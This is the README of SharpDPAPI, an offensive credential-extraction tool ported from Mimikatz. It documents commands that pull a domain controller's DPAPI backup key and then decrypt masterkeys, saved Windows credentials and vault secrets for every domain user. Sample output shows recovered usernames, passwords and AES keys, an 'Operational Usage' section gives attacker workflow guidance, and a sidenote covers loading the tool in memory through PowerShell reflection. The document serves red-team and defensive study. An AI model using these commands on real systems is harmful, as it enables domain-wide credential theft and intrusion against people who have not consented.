# SharpDPAPI

----

SharpDPAPI is a C# port of some DPAPI functionality from [@gentilkiwi](https://twitter.com/gentilkiwi)'s [Mimikatz](https://github.com/gentilkiwi/mimikatz/) project.

**I did not come up with this logic, it is simply a port from Mimikatz in order to better understand the process and operationalize it to fit our workflow.**

[@harmj0y](https://twitter.com/harmj0y) is the primary author of this port.

SharpDPAPI is licensed under the BSD 3-Clause license.


## Table of Contents

- [SharpDPAPI](#sharpdpapi)
  * [Table of Contents](#table-of-contents)
  * [Command Line Usage](#command-line-usage)
  * [Commands](#commands)
    + [backupkey](#backupkey)
    + [masterkeys](#masterkeys)
    + [credentials](#credentials)
    + [vaults](#vaults)
    + [triage](#triage)
  * [Compile Instructions](#compile-instructions)
    + [Targeting other .NET versions](#targeting-other-net-versions)
    + [Sidenote: Running SharpDPAPI Through PowerShell](#sidenote-running-sharpdpapi-through-powershell)

## Background

### Command Line Usage

    C:\Temp>SharpDPAPI.exe

     __                 _   _       _ ___
    (_  |_   _. ._ ._  | \ |_) /\  |_) |
    __) | | (_| |  |_) |_/ |  /--\ |  _|_
                   |
      v1.1


    Triage all reachable masterkey files, use a domain backup key to decrypt all that are found

      SharpDPAPI masterkeys </pvk:BASE64... | /pvk:key.pvk>


    Triage all reachable Credential files, Vaults, or both using a domain DPAPI backup key to decrypt masterkeys:

      SharpDPAPI <credentials|vaults|triage> </pvk:BASE64... | /pvk:key.pvk>


    Triage all reachable Credential files or Vaults, or both optionally using the GUID masterkey mapping to decrypt any matches:

      SharpDPAPI <credentials|vaults|triage> [GUID1:SHA1 GUID2:SHA1 ...]


    Triage a specific Credential file or folder, using GUID lookups or a domain backup key for decryption:

      SharpDPAPI credentials /target:C:\FOLDER\ [GUID1:SHA1 GUID2:SHA1 ... | /pvk:BASE64... | /pvk:key.pvk]
      SharpDPAPI credentials /target:C:\FOLDER\FILE [GUID1:SHA1 GUID2:SHA1 ... | /pvk:BASE64... | /pvk:key.pvk]


    Triage a specific Vault folder, using GUID lookups or a domain backup key for decryption:

      SharpDPAPI vaults /target:C:\FOLDER\ [GUID1:SHA1 GUID2:SHA1 ... | /pvk:BASE64... | /pvk:key.pvk]


    Retrieve a domain controller's DPAPI backup key, optionally specifying a DC and output file:

      SharpDPAPI backupkey [/server:primary.testlab.local] [/file:key.pvk]


### Operational Usage

One of the goals with SharpDPAPI is to operationalize Benjamin's DPAPI work in a way that fits with our workflow.

How exactly you use the toolset will depend on what phase of an engagement you're in. In general this breaks into "have I compromised the domain or not".

If domain admin (or equivalent) privileges have been obtained, the domain DPAPI backup key can be retrieved with the [backupkey](#backupkey) command (or with Mimikatz). This domain private key never changes, and can decrypt any DPAPI masterkey for domain users. This means, given a domain DPAPI backup key, an attacker can decrypt master keys for any domain user that can then be used to decrypt any Vault\Credentials\Chrome Logins\etc. The key retrieved from the [backupkey](#backupkey) command can be used with the [masterkeys](#masterkeys), [credentials](#credentials), or [vaults](#vaults) commands.

If DA privileges have not been achieved, using Mimikatz' `sekurlsa::dpapi` command will retrieve DPAPI masterkey {GUID}:SHA1 mappings of any loaded master keys on a given system (tip: running `dpapi::cache` after key extraction will give you a nice table). If you change these keys to a `{GUID1}:SHA1 {GUID2}:SHA1...` type format, they can be supplied to the [credentials](#credentials) or [vaults](#vaults) commands. This lets you triage all Credential files\Vaults on a system for any user who's currently logged in, without having to do file by file decrypts.

For more offensive DPAPI information, [check here](https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/).


## Commands

### backupkey

The **backupkey** command will retrieve the domain DPAPI backup key from a domain controller using the **LsaRetrievePrivateData** API approach [from Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/2fd09bbef0754317cd97c01dbbf49698ae23d9d2/mimikatz/modules/kuhl_m_lsadump.c#L1882-L1927). This private key can then be used to decrypt master key blobs for any user on the domain. And even better, the key never changes ;)

Domain admin (or equivalent) rights are needed to retrieve the key from a remote domain controller.

This base64 key blob can be decoded to a binary .pvk file that can then be used with Mimikatz' **dpapi::masterkey /in:MASTERKEY /pvk:backupkey.pvk** module, or used in blob form with the **masterkeys**, **credentials**, or **vault** SharpDPAPI commands.

By default, SharpDPAPI will try to determine the current domain controller via the **DsGetDcName** API call. A server can be specified with `/server:COMPUTER.domain.com`. If you want the key saved to disk instead of output as a base64 blob, use `/file:key.pvk`.

Retrieve the DPAPI backup key for the current DC:

    C:\Temp>SharpDPAPI.exe backupkey

      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.1


    [*] Action: Retrieve domain DPAPI backup key


    [*] Using current domain controller  : PRIMARY.testlab.local
    [*] Preferred backupkey Guid         : 32d021e7-ab1c-4877-af06-80473ca3e4d8
    [*] Full preferred backupKeyName     : G$BCKUPKEY_32d021e7-ab1c-4877-af06-80473ca3e4d8
    [*] Key :
              HvG1sAAAAAABAAAAAAAAAAAAAACUBAAABwIAAACkAABSU0EyAAgAAA...(snip)...


Retrieve the DPAPI backup key for the specified DC, output to a file:

    C:\Temp>SharpDPAPI.exe backupkey /server:primary.testlab.local /file:key.pvk

      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.1


    [*] Action: Retrieve domain DPAPI backup key


    [*] Using server                     : primary.testlab.local
    [*] Preferred backupkey Guid         : 32d021e7-ab1c-4877-af06-80473ca3e4d8
    [*] Full preferred backupKeyName     : G$BCKUPKEY_32d021e7-ab1c-4877-af06-80473ca3e4d8
    [*] Backup key written to            : key.pvk


### masterkeys

The **masterkeys** command will search for any readable masterkey files and decrypt them using a supplied domain DPAPI backup key to decrypt the masterkeys. It will return a set of masterkey {GUID}:SHA1 mappings.

The domain backup key can be in base64 form (`/pvk:BASE64...`) or file form (`/pvk:key.pvk`).

    C:\Temp>SharpDPAPI.exe masterkeys /pvk:key.pvk

      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.1


    [*] Action: Triage Masterkey Files

    [*] Found MasterKey : C:\Users\admin\AppData\Roaming\Microsoft\Protect\S-1-5-21-1473254003-2681465353-4059813368-1000\28678d89-678a-404f-a197-f4186315c4fa
    [*] Found MasterKey : C:\Users\harmj0y\AppData\Roaming\Microsoft\Protect\S-1-5-21-883232822-274137685-4173207997-1111\3858b304-37e5-48aa-afa2-87aced61921a
    ...(snip)...

    [*] Master key cache:

    {42e95117-ff5f-40fa-a6fc-87584758a479}:4C802894C566B235B7F34B011316...(snip)...
    ...(snip)...


### credentials

The **credentials** command will search for Credential files and decrypt them with either a supplied DPAPI domain backup key (`/pvk:BASE64...` or `/pvk:key.pvk`) or a {GUID}:SHA1 DPAPI lookup table. DPAPI GUID mappings can be recovered with Mimikatz' `sekurlsa::dpapi` command.

A specific credential file (or folder of credentials) can be specified with `/target:FILE` or `/target:C:\Folder\`.

Using domain DPAPI GUID mappings:

    C:\Temp>SharpDPAPI.exe credentials {44ca9f3a-9097-455e-94d0-d91de951c097}:9b049ce6918ab89937687...(snip)... {feef7b25-51d6-4e14-a52f-eb2a387cd0f3}:f9bc09dad3bc2cd00efd903...(snip)...

      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.1


    [*] Action: DPAPI Credential Triage

    [*] Triaging Credentials for ALL users


    Folder       : C:\Users\harmj0y\AppData\Local\Microsoft\Credentials\

      CredFile           : 48C08A704ADBA03A93CD7EC5B77C0EAB

        guidMasterKey    : {885342c6-028b-4ecf-82b2-304242e769e0}
        size             : 436
        flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
        algHash/algCrypt : 32772/26115
        description      : Local Credential Data

        LastWritten      : 1/22/2019 2:44:40 AM
        TargetName       : Domain:target=TERMSRV/10.4.10.101
        TargetAlias      :
        Comment          :
        UserName         : DOMAIN\user
        Credential       : Password!

      ...(snip)...


Using a domain DPAPI backup key:

    C:\Temp>SharpDPAPI.exe credentials /pvk:HvG1sAAAAAABAAAAAAAAAAAAAAC...(snip)...

      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.1


    [*] Action: DPAPI Credential Triage

    [*] Using a domain DPAPI backup key to triage masterkeys for decryption key mappings!

    [*] Triaging Credentials for current user


    Folder       : C:\Users\harmj0y\AppData\Local\Microsoft\Credentials\

      CredFile           : 48C08A704ADBA03A93CD7EC5B77C0EAB

        guidMasterKey    : {885342c6-028b-4ecf-82b2-304242e769e0}
        size             : 436
        flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
        algHash/algCrypt : 32772/26115
        description      : Local Credential Data

        LastWritten      : 1/22/2019 2:44:40 AM
        TargetName       : Domain:target=TERMSRV/10.4.10.101
        TargetAlias      :
        Comment          :
        UserName         : DOMAIN\user
        Credential       : Password!

    ...(snip)...


### vaults

The **vaults** command will search for Vault files and decrypt them with either a supplied DPAPI domain backup key (`/pvk:BASE64...` or `/pvk:key.pvk`) or a {GUID}:SHA1 DPAPI lookup table. DPAPI GUID mappings can be recovered with Mimikatz' `sekurlsa::dpapi` command.

The Policy.vpol folder in the Vault folder is decrypted with any supplied DPAPI keys to retrieve the associated AES decryption keys, which are then used to decrypt any associated .vcrd files.

A specific vault folder can be specified with `/target:C:\Folder\`.

Using domain DPAPI GUID mappings:

    C:\Temp>SharpDPAPI.exe vaults {44ca9f3a-9097-455e-94d0-d91de951c097}:9b049ce6918ab89937687...(snip)... {feef7b25-51d6-4e14-a52f-eb2a387cd0f3}:f9bc09dad3bc2cd00efd903...(snip)...
      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.1


    [*] Action: DPAPI Vault Triage

    [*] Triaging Vaults for ALL users


    [*] Triaging Vault folder: C:\Users\harmj0y\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

      VaultID            : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
      Name               : Web Credentials
        guidMasterKey    : {feef7b25-51d6-4e14-a52f-eb2a387cd0f3}
        size             : 240
        flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
        algHash/algCrypt : 32772/26115
        description      :
        aes128 key       : EDB42294C0721F2F1638A40F0CD67CD8
        aes256 key       : 84CD64B5F438B8B9DA15238A5CFA418C04F9BED6B4B4CCAC9705C36C65B5E793

        LastWritten      : 10/12/2018 12:10:42 PM
        FriendlyName     : Internet Explorer
        Identity         : admin
        Resource         : https://10.0.0.1/
        Authenticator    : Password!

    ...(snip)...


Using a domain DPAPI backup key:

    C:\Temp>SharpDPAPI.exe credentials /pvk:HvG1sAAAAAABAAAAAAAAAAAAAAC...(snip)...
      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.1


    [*] Action: DPAPI Vault Triage

    [*] Triaging Vaults for ALL users


    [*] Triaging Vault folder: C:\Users\harmj0y\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

      VaultID            : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
      Name               : Web Credentials
        guidMasterKey    : {feef7b25-51d6-4e14-a52f-eb2a387cd0f3}
        size             : 240
        flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
        algHash/algCrypt : 32772/26115
        description      :
        aes128 key       : EDB42294C0721F2F1638A40F0CD67CD8
        aes256 key       : 84CD64B5F438B8B9DA15238A5CFA418C04F9BED6B4B4CCAC9705C36C65B5E793

        LastWritten      : 10/12/2018 12:10:42 PM
        FriendlyName     : Internet Explorer
        Identity         : admin
        Resource         : https://10.0.0.1/
        Authenticator    : Password!

    ...(snip)...


### triage

The **triage** command runs the [credentials](#credentials) and [vaults](#vaults) triage commands simultaneously.


## Compile Instructions

We are not planning on releasing binaries for SharpDPAPI, so you will have to compile yourself :)

SharpDPAPI has been built against .NET 3.5 and is compatible with [Visual Studio 2015 Community Edition](https://go.microsoft.com/fwlink/?LinkId=532606&clcid=0x409). Simply open up the project .sln, choose "Release", and build.

### Targeting other .NET versions

SharpDPAPI's default build configuration is for .NET 3.5, which will fail on systems without that version installed. To target SharpDPAPI for .NET 4 or 4.5, open the .sln solution, go to **Project** -> **SharpDPAPI Properties** and change the "Target framework" to another version.

### Sidenote: Running SharpDPAPI Through PowerShell

If you want to run SharpDPAPI in-memory through a PowerShell wrapper, first compile the SharpDPAPI and base64-encode the resulting assembly:

    [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\SharpDPAPI.exe")) | Out-File -Encoding ASCII C:\Temp\SharpDPAPI.txt

SharpDPAPI can then be loaded in a PowerShell script with the following (where "aa..." is replaced with the base64-encoded SharpDPAPI assembly string):

    $SharpDPAPIAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String("aa..."))

The Main() method and any arguments can then be invoked as follows:

    [SharpDPAPI.Program]::Main("backupkey")
